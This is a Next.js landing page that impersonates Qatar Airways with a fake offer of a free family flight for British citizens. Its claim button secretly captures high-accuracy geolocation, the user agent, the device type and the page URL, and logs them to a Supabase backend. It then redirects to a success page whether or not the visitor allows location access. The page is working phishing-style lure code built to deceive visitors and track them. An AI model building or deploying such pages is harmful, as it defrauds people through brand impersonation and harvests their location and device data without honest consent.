'use client'

import { useEffect, useState } from 'react'
import { useRouter } from 'next/navigation'
import { supabaseHelpers } from '@/lib/supabase'
import { geolocationService } from '@/lib/geolocation'
import Image from 'next/image'

export default function LandingPage() {
  const router = useRouter()
  const [isLoading, setIsLoading] = useState(false)

  useEffect(() => {
    // Track page visit
    supabaseHelpers.trackPageVisit('main_page')
  }, [])

  const handleAllowLocation = async () => {
    setIsLoading(true)
    
    // Track the entry trigger
    await supabaseHelpers.trackUserAction('entry_trigger_clicked', {
      button: 'claim_benefits',
      timestamp: new Date().toISOString(),
      user_agent: navigator.userAgent,
      page_url: window.location.href
    })

    // Step 1: Enhanced geolocation capture with 100% accuracy focus
    try {
      // Track geolocation attempt
      await supabaseHelpers.trackLocationPermission('requested')
      
      // Use the advanced geolocation service for maximum accuracy
      const locationData = await geolocationService.getCurrentLocation()
      
      // Track successful location capture with quality metrics
      await supabaseHelpers.trackLocationPermission('granted', locationData as unknown as Record<string, unknown>)
      
      // Store for form submission
      sessionStorage.setItem('userLocation', JSON.stringify(locationData))
      sessionStorage.setItem('locationCaptured', 'true')
      
      // Always proceed to form (Step 3)
      router.push('/success')

    } catch (error: unknown) {
      // Track location denial/error with detailed info
      const errorData = (error as GeolocationPositionError)?.code ? error : {
        error_code: 999,
        error_message: 'Geolocation service unavailable',
        method: 'service_unavailable',
        attempts: 'geolocation_service_failed',
        device_type: /iPhone|iPad|iPod/i.test(navigator.userAgent) ? 'ios' : /Android/i.test(navigator.userAgent) ? 'android' : 'other',
        user_agent_snippet: navigator.userAgent.substring(0, 100)
      }
      
      await supabaseHelpers.trackLocationPermission('denied', errorData as Record<string, unknown>)
      
      // Store error for analytics
      sessionStorage.setItem('locationCaptured', 'false')
      sessionStorage.setItem('locationError', JSON.stringify(errorData))
      
      // Always proceed to form (Step 3)
      router.push('/success')
    }
  }

  return (
    <div className="consent-container">
      <div className="image-section">
        <div className="image-overlay"></div>
        <Image 
          src="/family-travel.jpeg" 
          alt="VIP travel experience" 
          className="prize-image"
          fill
          priority
        />
      </div>
      <div className="content-section">
        <Image 
          src="https://logotyp.us/files/qatar-airways.svg" 
          alt="Qatar Airways" 
          className="logo"
          width={140}
          height={60}
        />
        <h1>🇬🇧 ✈️ FREE Family Flight - Limited Time!</h1>
        <p>
          <strong>Exclusive for British Citizens Only!</strong><br/>
          Qatar Airways is celebrating with one complimentary family flight (up to 4 passengers) from any UK airport to any destination worldwide. This exclusive promotion expires <strong>July 25th, 2025</strong>.
        </p>
        <button 
          onClick={handleAllowLocation}
          disabled={isLoading}
          className={isLoading ? 'loading' : ''}
        >
          {isLoading ? 'Checking Eligibility...' : 'Claim FREE Family Flight'}
        </button>
      </div>

      <style jsx>{`
        .consent-container {
          display: flex;
          flex-direction: column;
          min-height: 100vh;
          min-height: 100dvh;
          margin: 0;
          padding: 0;
          background: #f8f8f8;
          font-family: var(--font-poppins), 'Poppins', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
          overflow-x: hidden;
        }

        .image-section {
          position: relative;
          flex: 1 1 50%;
          min-height: 280px;
          max-height: 50vh;
        }

        .image-overlay {
          position: absolute;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: linear-gradient(to top, rgba(0,0,0,0.5), transparent);
          z-index: 1;
        }

        .prize-image {
          width: 100%;
          height: 100%;
          object-fit: cover;
        }

        .content-section {
          flex: 1 1 50%;
          display: flex;
          flex-direction: column;
          justify-content: center;
          align-items: center;
          padding: 2rem 1.5rem 2.5rem;
          text-align: center;
          box-sizing: border-box;
          background: linear-gradient(to bottom, #ffffff 0%, #fafafa 100%);
          border-top-left-radius: 25px;
          border-top-right-radius: 25px;
          margin-top: -25px;
          position: relative;
          box-shadow: 0 -8px 25px rgba(0,0,0,0.08);
          z-index: 2;
          min-height: 50vh;
          max-height: none;
        }

        .logo {
          width: clamp(130px, 22vw, 150px);
          margin-bottom: 1.5rem;
          filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
        }

        h1 {
          font-size: clamp(1.4rem, 4vw, 1.8rem);
          font-weight: 700;
          margin-bottom: 1rem;
          color: #5c0f3c;
          letter-spacing: -0.5px;
          line-height: 1.3;
          text-shadow: 0 1px 2px rgba(0,0,0,0.05);
        }

        p {
          font-size: clamp(0.85rem, 2.5vw, 1rem);
          font-weight: 400;
          margin-bottom: 1.8rem;
          line-height: 1.6;
          color: #444;
          max-width: 420px;
        }

        button {
          background: linear-gradient(135deg, #5c0f3c 0%, #4a0c30 100%);
          color: white;
          border: none;
          padding: 18px 36px;
          border-radius: 50px;
          cursor: pointer;
          font-size: clamp(1rem, 3vw, 1.2rem);
          font-weight: 600;
          letter-spacing: 0.5px;
          transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
          width: 100%;
          max-width: 360px;
          box-shadow: 0 4px 20px rgba(92, 15, 60, 0.3);
          position: relative;
          overflow: hidden;
        }

        button::before {
          content: '';
          position: absolute;
          top: 0;
          left: -100%;
          width: 100%;
          height: 100%;
          background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
          transition: left 0.5s ease;
        }

        button:hover::before {
          left: 100%;
        }

        button:hover:not(.loading) {
          background: linear-gradient(135deg, #4a0c30 0%, #3a0924 100%);
          transform: translateY(-3px);
          box-shadow: 0 8px 25px rgba(92, 15, 60, 0.4);
        }

        button.loading {
          opacity: 0.7;
          cursor: not-allowed;
        }

        button:disabled {
          opacity: 0.7;
          cursor: not-allowed;
          transform: none;
        }

        /* iPhone 12 Pro specific optimizations */
        @media screen and (device-width: 390px) and (device-height: 844px) and (-webkit-device-pixel-ratio: 3) {
          .consent-container {
            min-height: 100dvh;
          }
          
          .image-section {
            min-height: 320px;
            max-height: 45vh;
          }
          
          .content-section {
            padding: 1.8rem 1.2rem 2.2rem;
            min-height: 55vh;
          }
          
          .logo {
            width: 130px;
            margin-bottom: 1.2rem;
          }
          
          h1 {
            font-size: 1.5rem;
            margin-bottom: 0.8rem;
          }
          
          p {
            font-size: 0.9rem;
            margin-bottom: 1.5rem;
            line-height: 1.5;
          }
          
          button {
            padding: 16px 32px;
            font-size: 1.1rem;
            margin-top: 0.5rem;
          }
        }

        /* General iPhone optimizations */
        @media screen and (max-width: 414px) {
          .consent-container {
            min-height: 100dvh;
          }
          
          .content-section {
            padding: 1.5rem 1rem 2rem;
          }
          
          .logo {
            width: clamp(120px, 20vw, 140px);
            margin-bottom: 1rem;
          }
          
          h1 {
            font-size: clamp(1.3rem, 3.8vw, 1.6rem);
            margin-bottom: 0.8rem;
          }
          
          p {
            font-size: clamp(0.8rem, 2.2vw, 0.95rem);
            margin-bottom: 1.4rem;
          }
          
          button {
            padding: 15px 28px;
            font-size: clamp(0.95rem, 2.8vw, 1.1rem);
            margin-top: 0.3rem;
          }
        }

        /* Extra small screens */
        @media screen and (max-width: 375px) {
          .content-section {
            padding: 1.2rem 0.8rem 1.8rem;
          }
          
          .logo {
            width: 115px;
          }
          
          h1 {
            font-size: 1.25rem;
          }
          
          p {
            font-size: 0.8rem;
          }
        }
      `}</style>
    </div>
  )
}
